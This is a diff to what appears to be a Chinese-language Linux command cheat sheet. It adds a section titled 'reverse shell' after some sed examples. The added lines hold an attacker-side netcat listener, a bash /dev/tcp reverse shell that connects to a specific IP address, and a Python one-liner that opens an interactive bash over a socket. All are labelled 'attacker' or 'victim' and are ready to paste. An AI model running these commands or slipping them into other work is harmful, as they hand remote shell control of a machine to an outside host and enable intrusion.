@@ -132,3 +132,11 @@ sudo lastb | awk '{print $3}' | grep '^[0-9]\{2,3\}' | uniq -c | sort -n -r | he
 sed -n 's/route/router/gp' file.txt # 打印全局替换的效果
 sed -i 's/route/router/g' file.txt  # 全局替换
 ```
+
+反弹shell
+```shell
+nc -lnvvp 7777 # attacker
+
+bash -i >& /dev/tcp/60.205.223.161/3333 0>&1 # victim
+python3 -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);" # victim
+```
